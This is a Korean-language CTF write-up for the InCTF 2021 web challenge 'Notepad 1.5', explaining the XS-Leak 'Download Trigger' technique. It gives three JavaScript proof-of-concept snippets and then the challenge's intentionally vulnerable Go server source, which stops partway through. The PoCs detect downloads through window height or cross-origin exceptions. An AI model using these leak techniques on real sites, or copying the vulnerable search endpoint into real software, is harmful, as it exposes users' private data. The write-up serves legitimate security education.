<!DOCTYPE html>
<html lang="en">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  
    <title>InCTF 2021 Notepad 1.5 - Arthur&#39;s Article Write Up :: My New Hugo Site</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="This article is about write-up for the InCTF 2021. there is only one web challenge, which contain XS-Leak via Download Trigger bug" />
<meta name="keywords" content="" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="http://localhost:1313/posts/2021-08-16-in-ctf/" />







  
  
  
  
  
  <link rel="stylesheet" href="http://localhost:1313/styles.css">







  <link rel="shortcut icon" href="http://localhost:1313/img/theme-colors/orange.png">
  <link rel="apple-touch-icon" href="http://localhost:1313/img/theme-colors/orange.png">



<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="InCTF 2021 Notepad 1.5 - Arthur&#39;s Article Write Up">
<meta property="og:description" content="This article is about write-up for the InCTF 2021. there is only one web challenge, which contain XS-Leak via Download Trigger bug" />
<meta property="og:url" content="http://localhost:1313/posts/2021-08-16-in-ctf/" />
<meta property="og:site_name" content="My New Hugo Site" />

  
    <meta property="og:image" content="img/favicon/%!s(&lt;nil&gt;).png">
  

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">


  <meta property="article:published_time" content="2021-08-16 23:29:53 &#43;0000 UTC" />













  


</head>
<body class="">




<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="http://localhost:1313/">
  <div class="logo">
    re-Terminal
  </div>
</a>

    </div>
    
    
  </div>
  
</header>


  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="http://localhost:1313/posts/2021-08-16-in-ctf/">InCTF 2021 Notepad 1.5 - Arthur&rsquo;s Article Write Up</a>
  </h1>
  <div class="post-meta"><time class="post-date">2021-08-16</time>
    
</div>

  
  



  

  <div class="post-content"><div>
        <h1 id="what-is-download-trigger">What is Download Trigger?<a href="#what-is-download-trigger" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p><img src="https://user-images.githubusercontent.com/49112423/129486098-81fcc315-0f12-4cd5-a414-e09bb8238e71.png" alt="image"></p>
<p>엔드포인트에서 <code>Content-Disposition: attachment</code> 헤더가 설정이 되면 브라우저는 응답을 하는 대신에 다운로드 할 파일을 탐색한다고 합니다. 특정 상황에 따라서 사용자의 계정 상태 및 여러 요소들에 따라서 달라지는 경우를 이용해서 중요 정보를 수집할 수 있습니다.</p>
<p><img src="https://user-images.githubusercontent.com/49112423/129486089-6b3179ed-13c5-4545-b8cf-2e957797d8ca.png" alt="image">
<img src="https://user-images.githubusercontent.com/49112423/129486161-316cf985-49e8-4f94-aa13-567cd166e523.png" alt="image"></p>
<p>Download Trigger 기법 중 첫 번째 방식은 크로니움 기반 브라우저에서 파일을 다운로드 하게 되면 위와 같이 브라우저 하단에 다운로드 한 파일의 미리 보기가 나타나는 것을 이용하는 것 입니다. 파일이 다운로드 될 때와, 다운로드가 되지 않을 때의 창 높낮이를 이용해서 정보를 유추하는 방식입니다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">screenHeight</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">innerHeight</span>;
</span></span><span style="display:flex;"><span>window.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#39;https://github.com/wjddnjs33/Exploit/archive/refs/heads/main.zip&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">setTimeout</span>(() =&gt; {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (window.<span style="color:#a6e22e">innerHeight</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">screenHeight</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;Download bar detected&#39;</span>);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;Download bar not detected&#39;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}, <span style="color:#ae81ff">2000</span>);
</span></span></code></pre></div><p>POC는 위와 같습니다.</p>
<p><img src="https://user-images.githubusercontent.com/49112423/129486249-b6607571-d727-4d57-b127-12556efa3d7c.png" alt="image"></p>
<p>정상적으로 파일이 다운로드 되었을 때 입니다.</p>
<p><img src="https://user-images.githubusercontent.com/49112423/129486284-a012c229-51dd-4203-8697-3b9dfa912bcb.png" alt="image"></p>
<p>파일이 다운로드 되지 않았을 때 입니다.</p>
<p>정상적으로 파일이 다운로드가 되었을 때는, 브라우저 하단에 생성된 창에 의해서 기본의 창에 크기보다 작아 졌기 때문에 다운로드 바가 탐지 되어 다고 출력이 되고, 되지 않았을 때는 창의 크기가 그대로이므로 다운로드 바가 탐지 되지 않았다고 출력 되는 것을 볼 수 있습니다.</p>
<p><img src="https://user-images.githubusercontent.com/49112423/129486501-7caca57c-97ae-4eb2-a7fa-57f9c472bd1d.png" alt="image"></p>
<p>두 번째 방식은 iframe을 이용해서 첨부 파일 탐색이 되었을 때, iframe이 교차 출처로 되는 것을 이용해서 판단하는 기법입니다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://github.com/wjddnjs33/Exploit/archive/refs/heads/main.zip&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">iframe</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#39;iframe&#39;</span>);
</span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">iframe</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">iframe</span>.<span style="color:#a6e22e">srcdoc</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`&lt;iframe src=&#34;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">url</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34; &gt;&lt;/iframe&gt;`</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">iframe</span>.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> () =&gt; {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">iframe</span>.<span style="color:#a6e22e">contentWindow</span>.<span style="color:#a6e22e">frames</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">origin</span>;
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;Download attempt detected&#39;</span>);
</span></span><span style="display:flex;"><span>      } <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;No download attempt detected&#39;</span>);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>POC는 위와 같습니다.</p>
<p><img src="https://user-images.githubusercontent.com/49112423/129486548-895bce61-2348-4f3b-aef6-bb4780540b1a.png" alt="image"></p>
<p>세 번째 방식은 두 번째 방식과 원리는 동일 하지만 iframe을 사용하지 않고 트리거 하는 방식 입니다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://example.org&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">win</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">open</span>(<span style="color:#a6e22e">url</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">setTimeout</span>(() =&gt; {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>          <span style="color:#75715e">// If a navigation occurs, the iframe will be cross-origin,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>          <span style="color:#75715e">// so accessing &#34;win.origin&#34; will throw an exception
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>          <span style="color:#a6e22e">win</span>.<span style="color:#a6e22e">origin</span>;
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">parent</span>.<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;Download attempt detected&#39;</span>);
</span></span><span style="display:flex;"><span>      } <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">parent</span>.<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;No download attempt detected&#39;</span>);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>}, <span style="color:#ae81ff">2000</span>);
</span></span></code></pre></div><p>POC는 위와 같습니다.</p>
<hr>
<h1 id="exploit-web-inctf-2021---notepad-15---arthurs-article-900-pts">Exploit (Web) InCTF 2021 - Notepad 1.5 - Arthur&rsquo;s Article [900 pts]<a href="#exploit-web-inctf-2021---notepad-15---arthurs-article-900-pts" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<blockquote>
<p>Notepad 1.5 - Arthur&rsquo;s Article 문제는 XS-Leak을 이용하여 플래그를 획득하는 문제 입니다.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;crypto/md5&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;encoding/hex&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;flag&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;fmt&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;html&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;log&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;math/rand&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;net/http&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;os&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;regexp&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;strings&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;time&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;github.com/gorilla/handlers&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;github.com/gorilla/mux&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">adminID</span> = <span style="color:#e6db74">&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">adminNOTE</span> = <span style="color:#e6db74">&#34;inctf{flag}&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">Notes</span> = make(<span style="color:#66d9ef">map</span>[<span style="color:#66d9ef">string</span>]<span style="color:#66d9ef">string</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Prevent XSS on api-endpoints ¬‿¬
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">cType</span> = <span style="color:#66d9ef">map</span>[<span style="color:#66d9ef">string</span>]<span style="color:#66d9ef">string</span>{
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;Content-Type&#34;</span>:            <span style="color:#e6db74">&#34;text/plain&#34;</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;x-content-type-options&#34;</span>:  <span style="color:#e6db74">&#34;nosniff&#34;</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;X-Frame-Options&#34;</span>:         <span style="color:#e6db74">&#34;DENY&#34;</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;Content-Security-Policy&#34;</span>: <span style="color:#e6db74">&#34;default-src &#39;none&#39;;&#34;</span>,
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">cookGenerator</span>() <span style="color:#66d9ef">string</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">hash</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">md5</span>.<span style="color:#a6e22e">Sum</span>([]byte(string(<span style="color:#a6e22e">rand</span>.<span style="color:#a6e22e">Intn</span>(<span style="color:#ae81ff">30</span>))))
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">hex</span>.<span style="color:#a6e22e">EncodeToString</span>((<span style="color:#a6e22e">hash</span>)[:])
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">headerSetter</span>(<span style="color:#a6e22e">w</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ResponseWriter</span>, <span style="color:#a6e22e">header</span> <span style="color:#66d9ef">map</span>[<span style="color:#66d9ef">string</span>]<span style="color:#66d9ef">string</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">k</span>, <span style="color:#a6e22e">v</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">header</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">Header</span>().<span style="color:#a6e22e">Set</span>(<span style="color:#a6e22e">k</span>, <span style="color:#a6e22e">v</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">getIDFromCooke</span>(<span style="color:#a6e22e">r</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Request</span>, <span style="color:#a6e22e">w</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ResponseWriter</span>) <span style="color:#66d9ef">string</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">cooke</span>, <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">Cookie</span>(<span style="color:#e6db74">&#34;id&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">re</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">regexp</span>.<span style="color:#a6e22e">MustCompile</span>(<span style="color:#e6db74">&#34;^[a-zA-Z0-9]+$&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">cookeval</span> <span style="color:#66d9ef">string</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">nil</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">re</span>.<span style="color:#a6e22e">MatchString</span>(<span style="color:#a6e22e">cooke</span>.<span style="color:#a6e22e">Value</span>) <span style="color:#f92672">&amp;&amp;</span> len(<span style="color:#a6e22e">cooke</span>.<span style="color:#a6e22e">Value</span>) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">35</span> <span style="color:#f92672">&amp;&amp;</span> len(<span style="color:#a6e22e">cooke</span>.<span style="color:#a6e22e">Value</span>) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">30</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">cookeval</span> = <span style="color:#a6e22e">cooke</span>.<span style="color:#a6e22e">Value</span>
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">cookeval</span> = <span style="color:#a6e22e">cookGenerator</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">c</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Cookie</span>{
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Name</span>:     <span style="color:#e6db74">&#34;id&#34;</span>,
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Value</span>:    <span style="color:#a6e22e">cookeval</span>,
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">SameSite</span>: <span style="color:#ae81ff">2</span>,
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">HttpOnly</span>: <span style="color:#66d9ef">true</span>,
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Secure</span>:   <span style="color:#66d9ef">false</span>,
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">SetCookie</span>(<span style="color:#a6e22e">w</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">c</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">cookeval</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">add</span>(<span style="color:#a6e22e">w</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ResponseWriter</span>, <span style="color:#a6e22e">r</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Request</span>) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">id</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">getIDFromCooke</span>(<span style="color:#a6e22e">r</span>, <span style="color:#a6e22e">w</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">id</span> <span style="color:#f92672">!=</span> <span style="color:#a6e22e">adminID</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">ParseForm</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">noteConte</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">Form</span>.<span style="color:#a6e22e">Get</span>(<span style="color:#e6db74">&#34;content&#34;</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> len(<span style="color:#a6e22e">noteConte</span>) &lt; <span style="color:#ae81ff">75</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Notes</span>[<span style="color:#a6e22e">id</span>] = <span style="color:#a6e22e">noteConte</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Fprintf</span>(<span style="color:#a6e22e">w</span>, <span style="color:#e6db74">&#34;OK&#34;</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">w</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ResponseWriter</span>, <span style="color:#a6e22e">r</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Request</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">id</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">getIDFromCooke</span>(<span style="color:#a6e22e">r</span>, <span style="color:#a6e22e">w</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">x</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">Notes</span>[<span style="color:#a6e22e">id</span>]
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">headerSetter</span>(<span style="color:#a6e22e">w</span>, <span style="color:#a6e22e">cType</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#34;</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Fprintf</span>(<span style="color:#a6e22e">w</span>, <span style="color:#e6db74">&#34;404 No Note Found&#34;</span>)
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">regexp</span>.<span style="color:#a6e22e">MustCompile</span>(<span style="color:#e6db74">&#34;&lt;[a-zA-Z0-9]&#34;</span>).<span style="color:#a6e22e">MatchString</span>(<span style="color:#a6e22e">x</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Fprintf</span>(<span style="color:#a6e22e">w</span>, <span style="color:#a6e22e">html</span>.<span style="color:#a6e22e">EscapeString</span>(<span style="color:#a6e22e">x</span>))
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Fprintf</span>(<span style="color:#a6e22e">w</span>, <span style="color:#a6e22e">x</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">find</span>(<span style="color:#a6e22e">w</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ResponseWriter</span>, <span style="color:#a6e22e">r</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Request</span>) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">id</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">getIDFromCooke</span>(<span style="color:#a6e22e">r</span>, <span style="color:#a6e22e">w</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">param</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">URL</span>.<span style="color:#a6e22e">Query</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">x</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">Notes</span>[<span style="color:#a6e22e">id</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">which</span> <span style="color:#66d9ef">string</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">str</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">param</span>[<span style="color:#e6db74">&#34;condition&#34;</span>]
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> !<span style="color:#a6e22e">err</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">which</span> = <span style="color:#e6db74">&#34;any&#34;</span>
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">which</span> = <span style="color:#a6e22e">str</span>[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">start</span> <span style="color:#66d9ef">bool</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">str</span>, <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">param</span>[<span style="color:#e6db74">&#34;startsWith&#34;</span>]
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> !<span style="color:#a6e22e">err</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">start</span> = <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">HasPrefix</span>(<span style="color:#a6e22e">x</span>, <span style="color:#e6db74">&#34;arthur&#34;</span>)
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">start</span> = <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">HasPrefix</span>(<span style="color:#a6e22e">x</span>, <span style="color:#a6e22e">str</span>[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">responseee</span> <span style="color:#66d9ef">string</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">end</span> <span style="color:#66d9ef">bool</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">str</span>, <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">param</span>[<span style="color:#e6db74">&#34;endsWith&#34;</span>]
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> !<span style="color:#a6e22e">err</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">end</span> = <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">HasSuffix</span>(<span style="color:#a6e22e">x</span>, <span style="color:#e6db74">&#34;morgan&#34;</span>)
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">end</span> = <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">HasSuffix</span>(<span style="color:#a6e22e">x</span>, <span style="color:#a6e22e">str</span>[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">which</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;starts&#34;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">start</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">responseee</span> = <span style="color:#a6e22e">x</span>
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">which</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;ends&#34;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">end</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">responseee</span> = <span style="color:#a6e22e">x</span>
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">which</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;both&#34;</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">start</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">end</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">responseee</span> = <span style="color:#a6e22e">x</span>
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">which</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;any&#34;</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">start</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">end</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">responseee</span> = <span style="color:#a6e22e">x</span>
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">present</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">param</span>[<span style="color:#e6db74">&#34;debug&#34;</span>]
